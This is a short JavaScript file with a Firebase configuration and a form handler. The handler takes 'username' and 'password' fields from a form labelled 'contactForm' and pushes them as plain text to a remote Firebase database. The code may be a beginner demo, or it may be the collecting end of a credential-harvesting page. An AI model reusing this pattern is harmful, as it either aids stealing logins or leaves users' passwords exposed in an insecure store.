const firebaseConfig = {
    apiKey: "AIzaSyC-CntfB-9WDNFxhogzMleeEkeQqO2FXh4",
    authDomain: "qr-scan-32ecb.firebaseapp.com",
    databaseURL: "https://qr-scan-32ecb-default-rtdb.firebaseio.com",
    projectId: "qr-scan-32ecb",
    storageBucket: "qr-scan-32ecb.appspot.com",
    messagingSenderId: "44710811035",
    appId: "1:44710811035:web:1febec4b19e617926dfd3e",
    measurementId: "G-0QJBZ4WNLY"
  };

  //khởi tạo database
  firebase.initializeApp(firebaseConfig);

  //referrence your database

  var contactFormDB = firebase.database().ref('contactForm');

  document.getElementById('contactForm').addEventListener('submit', submitForm);

  function submitForm(e) {
    e.preventDefault();
    var username = getElementVal('username');
    var password = getElementVal('password');

    saveMessages(username, password);

   
  }

  const saveMessages = (username, password) => {
    var newContacForm = contactFormDB.push();

    newContacForm.set({
        username : username,
        password : password,
    });
  };

  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };